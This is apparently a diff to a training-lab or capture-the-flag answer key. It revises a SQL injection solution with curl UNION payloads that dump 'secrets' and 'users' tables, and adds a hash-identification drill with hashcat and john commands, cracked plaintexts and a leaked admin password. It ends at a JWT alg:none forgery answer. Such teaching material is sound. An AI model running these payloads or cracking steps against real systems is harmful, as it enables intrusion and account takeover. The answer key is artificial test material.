@@ -33,27 +33,42 @@ curl -s "$B/oauth_callback.php?code=<CODE>"
 **Answer:** `q` concatenated into a 3-column query → UNION-dump the `secrets` table.
 **Command:**
 ```
-curl -sG "$B/search.php" --data-urlencode "q=zzz%' UNION SELECT k,v,3 FROM secrets-- -"
-# find columns first:  q=zzz%' ORDER BY 3-- -   (ok)   / ORDER BY 4-- - (error)
+curl -sG "$B/search.php" --data-urlencode "q=' UNION SELECT k,v,3 FROM secrets-- -"
+# find columns first:  q=' ORDER BY 3-- -   (ok)   / ORDER BY 4-- - (error)
 ```
 **Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`. **Reason:** `"...name LIKE '%$q%'"`, 3 columns (name,category,price).
 Deck: SQLi_Course_Labs · SQLi_Exploitation_Methodology.
 
-**Bonus — dump + crack the `users` table** (realistic "SQLi → cracking → account takeover"):
+**Bonus — dump + crack the `users` table** (realistic "SQLi → hash-ID → cracking → account takeover").
+The table mixes **several hash algorithms** — this is a *hash-identification* drill. Dump the hashes **and
+the salt column** (some rows are salted, some are not):
 ```
 # enumerate first: information_schema.tables -> products, users, secrets
-' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -
+# the users columns include salt:  information_schema.columns -> ...,password,salt,role
+' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,salt,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -
 ```
-→ usernames + **unsalted MD5** hashes + roles. Crack them:
+→ `username:hash:salt:role`. Now **identify each hash** (`hashid '<hash>'` or `hash-identifier`) and pick
+the right mode — the lengths/prefixes give it away (32 hex = MD5, 40 = SHA-1, 64 = SHA-256, `$2y$` = bcrypt):
+
+| user | hash | salt | algorithm | crack it with | plaintext |
+|---|---|---|---|---|---|
+| j.doe | `84d961…a576` (32 hex) | — | unsalted MD5 | `hashcat -m 0` / `john --format=raw-md5` | `superman` |
+| a.smith | `e68e11…361e` (40 hex) | — | unsalted SHA-1 | `hashcat -m 100` / `john --format=raw-sha1` | `trustno1` |
+| m.chen | `f145d6…d5d1` (64 hex) | `Tb82nR` | **salted** SHA-256 `sha256($pass.$salt)` | `hashcat -m 1410` (line `hash:salt`) | `ncc1701` |
+| svc_api | `$2y$08$…` | (built-in) | **bcrypt** (cost 8) | `hashcat -m 3200` / `john --format=bcrypt` | `qwerty123` |
+| admin | `99641c…79fb` (64 hex) | `kR9fQ2` | salted SHA-256 | `-m 1410` | **won't crack** (strong) |
+
 ```
-# put the 32-char hashes one per line in hashes.txt, then:
-hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
-john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-# -> password1 / sunshine / dragon / letmein
+# e.g. the salted SHA-256 (feed hash:salt) and the bcrypt:
+printf '%s\n' 'f145d6227d344b596be8dd6624f81a099e5ccd4234d181a653c1fdfc0a13d5d1:Tb82nR' > sha256.txt
+hashcat -m 1410 sha256.txt /usr/share/wordlists/rockyou.txt
+printf '%s\n' '$2y$08$cguMochk7lKasJ6uKqA4dOQ8HnotyVZe7P0apRXlmfRdyP.9Vvbh.' > bc.txt
+hashcat -m 3200 bc.txt /usr/share/wordlists/rockyou.txt      # slow by design — give it time
 ```
-`admin`'s hash is a strong password and won't crack from rockyou — **but it equals `secrets.admin_pw`
-(`Nexus!Adm1n#2026`)**, so the SQLi already gave it to you. Lesson: unsalted MD5 + a reused admin
-password turn a single SQLi into full account takeover.
+`admin`'s password is strong and won't fall even here — **but it equals `secrets.admin_pw`
+(`Nexus!Adm1n#2026`)**, which the SQLi already leaked → takeover with no cracking at all. Lesson: **the
+algorithm sets the cost** — legacy MD5/SHA-1 fall instantly, a salt forces one crack per hash, and
+bcrypt's work factor is what actually buys time; none of it helps a weak or reused password.
 
 ## 2. JWT forgery  (`login.php` → `account.php`)
 **Answer:** the verifier accepts **`alg:none`** *and* signs HS256 with a **weak secret** (`secret`). Either path forges `role=admin`.
